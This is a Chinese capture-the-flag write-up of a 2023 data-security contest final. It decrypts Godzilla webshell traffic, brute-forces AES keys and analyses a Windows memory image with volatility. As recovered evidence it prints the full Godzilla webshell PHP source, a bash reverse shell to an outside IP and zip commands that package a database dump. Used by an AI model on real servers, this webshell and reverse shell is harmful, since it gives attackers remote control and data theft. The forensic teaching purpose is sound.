---
title: 2023 江苏省数据安全竞赛 决赛
contest: 江苏省数据安全竞赛 2023
year: 2023
difficulty: medium
vuln_type: forensic_disk
tags:
- 哥斯拉webshell
- 流量解密
- AES-CBC_md5爆破
- IPV6
- 内存取证
- volatility
- ThinkPHP
- 后门IP
attack_chain:
- 流量包 67 流：哥斯拉 webshell 自定义 XOR 加密 (key=6cfcfe9b99c68a0a)
- dec 函数 c[i] ^ key[(i+1)&15] + base64 + gzip 解压
- 获取受害服务器上游 IPv6 地址 fd15:4ba5:5a2b:1008:60b9:ff63:528e:149d
- 流量 23 流 AES-256-CBC iv+ct 拼接，md5(5位hex) 爆破 key
- key=61c42 还原出 zip -P SN@jSoiueFIEZSIDJ 打包
- 流量 76 流另一份加密 bash reverse shell → 114.5.1.211:42321
- 第 2 个 key=23b4d 爆破 ThinkPHP 框架 version.zip 密码 MS1209D@IOEJabnsdIUJEOI@
- 答案：nginx:1.22.1_8.1.17_thinkphp:6.0.12
- volatility 内存镜像 Win7SP1x64 netscan 找 nc.exe 外连 192.168.233.1_54266
- Passware Kit Forensic 爆破 BGS-Chenyi 开机密码 abc123456
- memdump -p 3036 搜 LOGONSERVER = BGS-CHENYJ-PC
key_payload: '''iv + ct 模式：AES-256-CBC, iv[:16] + ct[16:]'''
one_liner: 哥斯拉 webshell 流量解密 + AES md5 爆破 5 位 hex key + 内存取证 + 框架版本还原。
lesson: 哥斯拉 webshell 加密模式 = XOR(16 byte key) + base64 + gzip；AES-CBC key 爆破 = md5(hex(i).rjust(5,'0'))。
quality: medium
full_path: 2023_江苏省数据安全竞赛_决赛.full.md
meta_path: 2023_江苏省数据安全竞赛_决赛.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 2023 江苏省数据安全竞赛 决赛。哥斯拉 webshell 流量解密 + AES md5 爆破 5 位 hex key + 内存取证 + 框架版本还原。。关键路径：流量包 67 流：哥斯拉 webshell 自定义 XOR 加密 (key=6cfcfe9b99c68a0a) → dec 函数 c[i] ^ key[(i+1)&15] + base64 + gzip 解压 → 获取受害服务器...
category: forensic
subcategory: disk_forensics
tools_used:
- ThinkPHP
- netcat
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/142203.html
reasoning_chain:
- 触发点：流量包第 67 流哥斯拉 webshell 自定义 XOR 加密 → 假设解 XOR + base64 + gzip
- 动作：写 dec 函数 c[i]^key[(i+1)&15] → 观察：解压还原流量含 IPv6
- 假设：第 23 流 iv+ct 拼接是 AES-256-CBC → 动作：md5(5位hex) 爆破 key
- 观察：key=61c42 → 下一步：用 key 解压出 zip 密码 SN@jSoiueFIEZSIDJ
- 触发点：另一份加密 bash reverse shell → 假设第二段同样 XOR 加密 → 动作：解 114.5.1.211:42321
- 动作：key=23b4d 爆破 ThinkPHP 框架 zip密码 → 观察：还原 nginx1.22.1_8.1.17_thinkphp6.0.12
- 触发点：第 2 部分 Win7SP1x64 内存镜像 → 动作：volatility netscan 找 nc.exe
- 观察：192.168.233.1_54266 外连 → Passware Kit 爆破 BGS-Chenyi 开机密码 abc123456
failed_attempts:
- 试图直接 strings 看 webshell 流量密文 → 失败：含 base64+gzip 需先 XOR 解码
- 试图手工解 AES-CBC key → 失败：key 是 5 位 hex 需 md5 爆破
key_observations:
- 哥斯拉 webshell 加密模式 = XOR(16 byte key) + base64 + gzip 三段拼接
- AES-CBC 5 位 hex key 爆破 = md5(hex(i).rjust(5,'0')) 字典
- volatility netscan 找 nc.exe 外连是内存取证固定套路
- ThinkPHP 框架 zip 密码可爆破，nginx + thinkphp 版本号组合还原
prerequisites:
- 哥斯拉 webshell 通信协议与加密模式
- AES-CBC 加解密与 PKCS7 padding
- volatility 内存取证基础命令
- Passware Kit Forensic 爆破工具使用
---
# 2023 江苏省数据安全竞赛 决赛

> 原文: https://www.ctfiot.com/142203.html
> ID: 142203

一个多月前的比赛了，直到最近偶然得知出题人竟在我“身边”，要来wp，才把比赛中没解出来的题目补全。（倒也没补得很全，还有一题逆向，不过那属于知识盲区了，逆向的区域，以后再来探索叭。）

crypto-easy_rsa
基础 rsa，e 和 phi 公因子5，所以除5，算d，解密，开根

这题值得另起一篇文章分析。

黑客使用哥斯拉成功连接受害服务器并返回数据的时间是_____________。（格式为YYYY-MM-DD_HH:MM:SS）

回到问题，数据返回的时间是

受害服务器的上游服务器IPv6地址是_________________。

解密第 67 流最下面的密文数据，

import gzip
def dec(c,key):
 p=""
 for i in range(len(c)):
  p += chr(ord(c[i])^ord(key[(i+1)&15]))
 return p

cipher = b"fO1rZmU5Yjk5YEtsqkLCDne7iE3No89VJx0yixLpBdTJXjOGqU2tfxwj7qInvyAUEtT7CfoSDh7QJvm6I8f9zfNoJAIDHjncHL0Vr6LpypsL2oZS/z/xYA1aBPEbbhqJrsQcRaXfsUnLPzvqb27Y+d7aK7UYR0Li1izdxQ/TvMG/PWwhSrXfCXGFdyqvjIb1pe3fFdkdqQDjb0v3xU1XmuTvzMnKkSrO4EIT04yGYZIOpCZUytFAYOnLfPpBuPIey/ULs9NwqS9Oaju72mswqHZhS/yobzO1J22xpB0Tlm+Sgdm+w2LVw3ykQCnm+VNqssJp8dadPH9O9MT1gh4cDPM7bePNdekG64HJTtc8y2Ox0LMEdPxOMN7I0G5kSsVmBpMRfCn6C5T97o9VWzp2RbcWIM3rqBSpjIZ8IlYIsnrx7HmwFZ5wi2XTQR14nJJU4P7PM4Y7pvevKjVdhaKItcNYK52nQz2mjXyxRqabEM/yDB/PQzTJv9onHAEYhwckZjd7yucx+w5a+ubvB2YJKRI/FCWmscTPPYMCebpckooUTHY/E4FvvJ40/MKCmR2dHls3e8ponKmqEavX/bA7ermcqyFpvUpO4HD2Cckjv7uDaPnw3ob+VwipTW1SU7dLjoD9p14XRxJWJXMN9Cu7Q9zZENsAbif7lgscBzEz/Kov9Ok3oL7edfIRgcVBPBzPW4WshuzzxCLkucS2+H9z2GaLm52yNXIjNCMmFlhBiOEaNWQoZH3gMOzcp7ZqXrz4wR7sYLgQuCl4rFW14K4hG+Fbsay9KJ27gPOrYVwI2iYEa0PkdN8wNs9lGzu1gPc4/kMls1rh52m63kbajPh6geBGa0e1WnK+yrrU3rIC2gmjKynJ+QUQQM+gH8RkcoUAr3yRD09xupGngrBi5/ESUbIHZlBTn6GDP6HK6xD7B85+Lj+zZ52kjESwOu8i74Bwamrk0cn+z+zBu9Yb0iab1XBTRKoOHD0JrtX1R3oV0J7vi9pahwsd/e5MNEt9X01KbbxUPtn4LuDZH61ZvBhT8ICM0XH5pgq2eAFI/mRbWgA9pih/ot9Grf9GIYIC75cGJzfuSScjGg5Fcy6WqrsANDiT4C+de19P/uWRX0H/eYuVuv5vCQYYJrpOpwHI7nORbdeXjhsrn/kpVuy9L/n3QOVHID0j/af4LofMy71Ov8M8O9gdlWhjvfIgyTmAE3+PgmNjZg=="
from base64 import *

gg = dec(b64decode(cipher).decode("latin1"),"6cfcfe9b99c68a0a")
print(gzip.decompress(gg.encode("latin1")).decode())

得到

OsInfo : Linux ctmd 6.2.0-32-generic #32~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 18 10:40:13 UTC 2 x86_64
CurrentUser : www
REMOTE_ADDR : fd15:
4ba5:
5a2b:
1008:
20c:
29ff:
fe57:
a107
REMOTE_PORT : 33928
HTTP_X_FORWARDED_FOR : fd15:
4ba5:
5a2b:
1008:
f581:
619a:
b163:
c627
HTTP_CLIENT_IP : 
SERVER_ADDR : fd15:
4ba5:
5a2b:
1008:
60b9:
ff63:
528e:
149d
SERVER_NAME : tp6.0.1.com
SERVER_PORT : 32154
disable_functions : 
Open_basedir : 
timezone : PRC
encode : 
extension_dir : /www/server/php/81/lib/php/extensions/no-debug-non-zts-20210902
systempdir : /tmp/
include_path : .:
DOCUMENT_ROOT : /www/wwwroot/32154/tp/public
PHP_SAPI : fpm-fcgi
PHP_VERSION : 8.1.17
PHP_INT_SIZE : 8
ProcessArch : x64
PHP_OS : Linux
canCallGzipDecode : 1
canCallGzipEncode : 1
session_name : PHPSESSID
session_save_path : 
session_save_handler : files
session_serialize_handler : php
user_ini_filename : .user.ini
memory_limit : 128M
upload_max_filesize : 50M
post_max_size : 50M
max_execution_time : 0
max_input_time : 60
default_socket_timeout : 60
mygid : 1001
mypid : 81435
SERVER_SOFTWAREypid : nginx/1.22.1
loaded_extensions : Core,date,libxml,openssl,pcre,sqlite3,zlib,bcmath,ctype,curl,dom,filter,ftp,gd,gettext,hash,iconv,intl,json,mbstring,SPL,session,pcntl,standard,mysqlnd,PDO,pdo_mysql,pdo_sqlite,Phar,posix,Reflection,mysqli,shmop,SimpleXML,soap,sockets,sodium,sysvsem,tokenizer,xml,xmlreader,xmlwriter,cgi-fcgi,zip
short_open_tag : true
asp_tags : false
safe_mode : false
CurrentDir : /www/wwwroot/32154/tp/public
FileRoot : /

三个 ipv6 都试了一下，好像是：fd15:
4ba5:
5a2b:
1008:
60b9:
ff63:
528e:
149d

黑客对受害服务器上的敏感文件进行打包操作，请问该压缩包密码是___________。

接下来是非常脑洞的部分：

在 57 流能够看到一段base64

解密后是一段php 的 aes 加密

<?php    
function customEncrypt($data, $key) {
    $key = md5($key);
    $iv = random_bytes(16);
    $encryptedData = openssl_encrypt($data, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
    $result = base64_encode($iv . $encryptedData);
    return $result;
}

但是我们没key啊？预期解是让我们爆，，key 的长度是 5 个字符，并且是十六进制字符，很难崩，爆出来的密钥是 61c42

找到第23流的数据

from base64 import *

cc = b64decode("jiVOhckW3Dp9ePlm2iuyBWBHWNlDxWbTlAqPt+JLIa8s3+vJZlcVIHKETqbIknErPCkevvm3heHFI5Vc5W8Wby8+W+6hfhjM/i0XyxsbIZVj5QyHQ4isWlekCszQlevGH8SlxjvfIRcbMxdUXREI/EWGiZKdFL81U80x7V9em+MJ4KsScq0bgnJ98yq1nMcl")

c = cc[16:]
iv = cc[:16]
key = b'a5a74e2ab431761ecb2299ef88d46a38'
from Crypto.Cipher import AES
enc = AES.new(iv=iv,key=key,mode=AES.MODE_CBC)
print(enc.decrypt(c))

得到

b’system(‘zip -q -r -P “SN@jSoiueFIEZSIDJ” /www/wwwroot/32154/tp/public/flag.zip /www/wwwroot/32154/tp/public/db/dumpfile.sql’);x02x02′

黑客留下的后门IP地址和端口号是________________。（格式为IP_PORT）

解密tcp 76流的流量，

import gzip
def dec(c,key):
 p=""
 for i in range(len(c)):
  p += chr(ord(c[i])^ord(key[(i+1)&15]))
 return p

cipher = b"fO1rZmU5Yjk5YGVutX+r+rApKUqr2WAoM9n/MouZdJ+qbHM4w7v4pEcpXKEfeRO33cfC7/uQ/Jin8peZ37nwh/LH4ev/mFg5tEnbaCIwYTY="
from base64 import *

gg = dec(b64decode(cipher).decode("latin1"),"6cfcfe9b99c68a0a")
print(gzip.decompress(gg.encode("latin1")).decode())

得到

#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/114.5.1.211/42321 <&1'

受害服务器上的中间件、中间件版本、PHP版本、框架名以及对应版本为___________。（格式为：中间件:
中间件版本_PHP版本_框架名:
框架版本，如tomcat:9.0.0_5.4.0_yii:2.38.0）

根据第二题的信息，我们知道中间件的版本是 nginx/1.22.1；php的版本是 8.1.17，但是不知道 thinkphp 的版本

和第三小题一样，不过密钥又换了 ，这回是 ‘23b4d’

from base64 import *
from hashlib import md5
cc = b64decode("4Q77JutsR+DCTQEDptU6aUvtVVu5h+F+mIHcSE3jJl9hnjPSnBapKdxNNJ3i0Qgr")

from Crypto.Cipher import AES
c = cc[16:]
iv = cc[:16]
for i in range(1048575):
 key = md5(hex(i)[2:].rjust(5,'0').encode()).hexdigest().encode()
#key = b'a5a74e2ab431761ecb2299ef88d46a38'
#key = b'1d77b220bdf94d38007e3e6e9c380588'
 enc = AES.new(iv=iv,key=key,mode=AES.MODE_CBC)
 res = enc.decrypt(c)
 if res[-1]==res[-2]==res[-3]:
  print(res,hex(i))

找到 version.zip 的密码

from base64 import *
from hashlib import md5
cc = b64decode("WsclGnueTdLgsUSeNeoqvUouMsABv70pjjt+0cUFsLQMlEkgUVXIZV4cyshI0Z5aGXQ4ZNefWX37rbR88Im2Qp5j08fnwXj9st8vV2cdhfODV24X0iL5V5aR0pB+eRiNE+oDRLAQBxR2UBcnjCk/inupvIHpSzD9Ug1GhtFGdMW/SeF0+s6LCaeRSqvoggeF")

from Crypto.Cipher import AES
c = cc[16:]
iv = cc[:16]
key = b'1d77b220bdf94d38007e3e6e9c380588'
enc = AES.new(iv=iv,key=key,mode=AES.MODE_CBC)
res = enc.decrypt(c)
print(res)

# b'system("zip -q -r -P "MS1209D@IOEJabnsdIUJEOI@" /www/wwwroot/32154/tp/public/version.zip /www/wwwroot/32154/tp/composer.json");x01'

8604数据包拿到 version.zip

获得框架版本

所以 flag：nginx:1.22.1_8.1.17_thinkphp:6.0.12

（比赛的时候根本没人能想到这么脑洞的加密方式，因此与压缩包密码相关的两题也都没人能做出来）

请给出内存镜像中黑客使用工具对外连接的IP地址及端口号是___________。（格式为IP_PORT）

volatility_2.6_win64_standalone.exe -f MemoryLife.raw --profile=Win7SP1x64 netscan

找到一个nc.exe 外连192.168.233.1_54266

请给出内存镜像中用户BGS-Chenyi的开机密码___________。

使用工具 Passware Kit Forensic

abc123456

黑客工具里的LOGONSERVER环境变量值是___________。

把 nc.exe dump下来，搜索LOGONSERVER，找到 BGS-CHENYJ-PC

volatility_2.6_win64_standalone.exe -f MemoryLife.raw --profile=Win7SP1x64 pslist

volatility_2.6_win64_standalone.exe -f MemoryLife.raw --profile=Win7SP1x64 memdump -p 3036 -D ./

请给出内存镜像中屏幕里的内容___________。

请给出wps.ini最后的修改时间_____________。（格式为YYYY-MM-DD_hh:mm:
ss_+0000）

附件链接：https://pan.baidu.com/s/1_TZbTEMiyiBKX_STc-81gQ?pwd=0t61


```
from Crypto.Util.number import *

p=
q=
e=
c=

phi=(p-1)*(q-1)
d = inverse(e/5,phi)
m = pow(c,d,n)
m = iroot(m,5)[0]
print(long_to_bytes(m))
c = '151911020907180A060E1D0506105F5F4B465F000248115C525D1B0756000E570c0457025c1c15535913'
m = '737570657263616C6966726167696C697374696365787069616C69646F63696F757363616E647963616E'

from pwn import xor

print(xor(bytes.fromhex(m),bytes.fromhex(c)))

b'flag{dyfohoday36826cg0a531rc9cg8yw4c2xl08}'
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='oL@ns!@opaOiw';
$payloadName='payload';
$key='6cfcfe9b99c68a0a';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
  eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
import gzip
def dec(c,key):
 p=""
 for i in range(len(c)):
  p += chr(ord(c[i])^ord(key[(i+1)&15]))
 return p

cipher = b""
from base64 import *

gg = dec(b64decode(cipher).decode("latin1"),"6cfcfe9b99c68a0a")
print(gzip.decompress(gg.encode("latin1")).decode())
import gzip
def dec(c,key):
 p=""
 for i in range(len(c)):
  p += chr(ord(c[i])^ord(key[(i+1)&15]))
 return p

cipher = b"fO1rZmU5Yjk5YEtsqkLCDne7iE3No89VJx0yixLpBdTJXjOGqU2tfxwj7qInvyAUEtT7CfoSDh7QJvm6I8f9zfNoJAIDHjncHL0Vr6LpypsL2oZS/z/xYA1aBPEbbhqJrsQcRaXfsUnLPzvqb27Y+d7aK7UYR0Li1izdxQ/TvMG/PWwhSrXfCXGFdyqvjIb1pe3fFdkdqQDjb0v3xU1XmuTvzMnKkSrO4EIT04yGYZIOpCZUytFAYOnLfPpBuPIey/ULs9NwqS9Oaju72mswqHZhS/yobzO1J22xpB0Tlm+Sgdm+w2LVw3ykQCnm+VNqssJp8dadPH9O9MT1gh4cDPM7bePNdekG64HJTtc8y2Ox0LMEdPxOMN7I0G5kSsVmBpMRfCn6C5T97o9VWzp2RbcWIM3rqBSpjIZ8IlYIsnrx7HmwFZ5wi2XTQR14nJJU4P7PM4Y7pvevKjVdhaKItcNYK52nQz2mjXyxRqabEM/yDB/PQzTJv9onHAEYhwckZjd7yucx+w5a+ubvB2YJKRI/FCWmscTPPYMCebpckooUTHY/E4FvvJ40/MKCmR2dHls3e8ponKmqEavX/bA7ermcqyFpvUpO4HD2Cckjv7uDaPnw3ob+VwipTW1SU7dLjoD9p14XRxJWJXMN9Cu7Q9zZENsAbif7lgscBzEz/Kov9Ok3oL7edfIRgcVBPBzPW4WshuzzxCLkucS2+H9z2GaLm52yNXIjNCMmFlhBiOEaNWQoZH3gMOzcp7ZqXrz4wR7sYLgQuCl4rFW14K4hG+Fbsay9KJ27gPOrYVwI2iYEa0PkdN8wNs9lGzu1gPc4/kMls1rh52m63kbajPh6geBGa0e1WnK+yrrU3rIC2gmjKynJ+QUQQM+gH8RkcoUAr3yRD09xupGngrBi5/ESUbIHZlBTn6GDP6HK6xD7B85+Lj+zZ52kjESwOu8i74Bwamrk0cn+z+zBu9Yb0iab1XBTRKoOHD0JrtX1R3oV0J7vi9pahwsd/e5MNEt9X01KbbxUPtn4LuDZH61ZvBhT8ICM0XH5pgq2eAFI/mRbWgA9pih/ot9Grf9GIYIC75cGJzfuSScjGg5Fcy6WqrsANDiT4C+de19P/uWRX0H/eYuVuv5vCQYYJrpOpwHI7nORbdeXjhsrn/kpVuy9L/n3QOVHID0j/af4LofMy71Ov8M8O9gdlWhjvfIgyTmAE3+PgmNjZg=="
from base64 import *

gg = dec(b64decode(cipher).decode("latin1"),"6cfcfe9b99c68a0a")
print(gzip.decompress(gg.encode("latin1")).decode())
OsInfo : Linux ctmd 6.2.0-32-generic #32~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 18 10:40:13 UTC 2 x86_64
CurrentUser : www
REMOTE_ADDR : fd15:
4ba5:
5a2b:
1008:
20c:
29ff:
fe57:
a107
REMOTE_PORT : 33928
HTTP_X_FORWARDED_FOR : fd15:
4ba5:
5a2b:
1008:
f581:
619a:
b163:
c627
HTTP_CLIENT_IP : 
SERVER_ADDR : fd15:
4ba5:
5a2b:
1008:
60b9:
ff63:
528e:
149d
SERVER_NAME : tp6.0.1.com
SERVER_PORT : 32154
disable_functions : 
Open_basedir : 
timezone : PRC
encode : 
extension_dir : /www/server/php/81/lib/php/extensions/no-debug-non-zts-20210902
systempdir : /tmp/
include_path : .:
DOCUMENT_ROOT : /www/wwwroot/32154/tp/public
PHP_SAPI : fpm-fcgi
PHP_VERSION : 8.1.17
PHP_INT_SIZE : 8
ProcessArch : x64
PHP_OS : Linux
canCallGzipDecode : 1
canCallGzipEncode : 1
session_name : PHPSESSID
session_save_path : 
session_save_handler : files
session_serialize_handler : php
user_ini_filename : .user.ini
memory_limit : 128M
upload_max_filesize : 50M
post_max_size : 50M
max_execution_time : 0
max_input_time : 60
default_socket_timeout : 60
mygid : 1001
mypid : 81435
SERVER_SOFTWAREypid : nginx/1.22.1
loaded_extensions : Core,date,libxml,openssl,pcre,sqlite3,zlib,bcmath,ctype,curl,dom,filter,ftp,gd,gettext,hash,iconv,intl,json,mbstring,SPL,session,pcntl,standard,mysqlnd,PDO,pdo_mysql,pdo_sqlite,Phar,posix,Reflection,mysqli,shmop,SimpleXML,soap,sockets,sodium,sysvsem,tokenizer,xml,xmlreader,xmlwriter,cgi-fcgi,zip
short_open_tag : true
asp_tags : false
safe_mode : false
CurrentDir : /www/wwwroot/32154/tp/public
FileRoot : /
<?php    
function customEncrypt($data, $key) {
    $key = md5($key);
    $iv = random_bytes(16);
    $encryptedData = openssl_encrypt($data, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
    $result = base64_encode($iv . $encryptedData);
    return $result;
}
from base64 import *

cc = b64decode("jiVOhckW3Dp9ePlm2iuyBWBHWNlDxWbTlAqPt+JLIa8s3+vJZlcVIHKETqbIknErPCkevvm3heHFI5Vc5W8Wby8+W+6hfhjM/i0XyxsbIZVj5QyHQ4isWlekCszQlevGH8SlxjvfIRcbMxdUXREI/EWGiZKdFL81U80x7V9em+MJ4KsScq0bgnJ98yq1nMcl")

c = cc[16:]
iv = cc[:16]
key = b'a5a74e2ab431761ecb2299ef88d46a38'
from Crypto.Cipher import AES
enc = AES.new(iv=iv,key=key,mode=AES.MODE_CBC)
print(enc.decrypt(c))
import gzip
def dec(c,key):
 p=""
 for i in range(len(c)):
  p += chr(ord(c[i])^ord(key[(i+1)&15]))
 return p

cipher = b"fO1rZmU5Yjk5YGVutX+r+rApKUqr2WAoM9n/MouZdJ+qbHM4w7v4pEcpXKEfeRO33cfC7/uQ/Jin8peZ37nwh/LH4ev/mFg5tEnbaCIwYTY="
from base64 import *

gg = dec(b64decode(cipher).decode("latin1"),"6cfcfe9b99c68a0a")
print(gzip.decompress(gg.encode("latin1")).decode())
#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/114.5.1.211/42321 <&1'
from base64 import *
from hashlib import md5
cc = b64decode("4Q77JutsR+DCTQEDptU6aUvtVVu5h+F+mIHcSE3jJl9hnjPSnBapKdxNNJ3i0Qgr")

from Crypto.Cipher import AES
c = cc[16:]
iv = cc[:16]
for i in range(1048575):
 key = md5(hex(i)[2:].rjust(5,'0').encode()).hexdigest().encode()
    #key = b'a5a74e2ab431761ecb2299ef88d46a38'
    #key = b'1d77b220bdf94d38007e3e6e9c380588'
 enc = AES.new(iv=iv,key=key,mode=AES.MODE_CBC)
 res = enc.decrypt(c)
 if res[-1]==res[-2]==res[-3]:
  print(res,hex(i))
from base64 import *
from hashlib import md5
cc = b64decode("WsclGnueTdLgsUSeNeoqvUouMsABv70pjjt+0cUFsLQMlEkgUVXIZV4cyshI0Z5aGXQ4ZNefWX37rbR88Im2Qp5j08fnwXj9st8vV2cdhfODV24X0iL5V5aR0pB+eRiNE+oDRLAQBxR2UBcnjCk/inupvIHpSzD9Ug1GhtFGdMW/SeF0+s6LCaeRSqvoggeF")

from Crypto.Cipher import AES
c = cc[16:]
iv = cc[:16]
key = b'1d77b220bdf94d38007e3e6e9c380588'
enc = AES.new(iv=iv,key=key,mode=AES.MODE_CBC)
res = enc.decrypt(c)
print(res)

# b'system("zip -q -r -P "MS1209D@IOEJabnsdIUJEOI@" /www/wwwroot/32154/tp/public/version.zip /www/wwwroot/32154/tp/composer.json");x01'
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]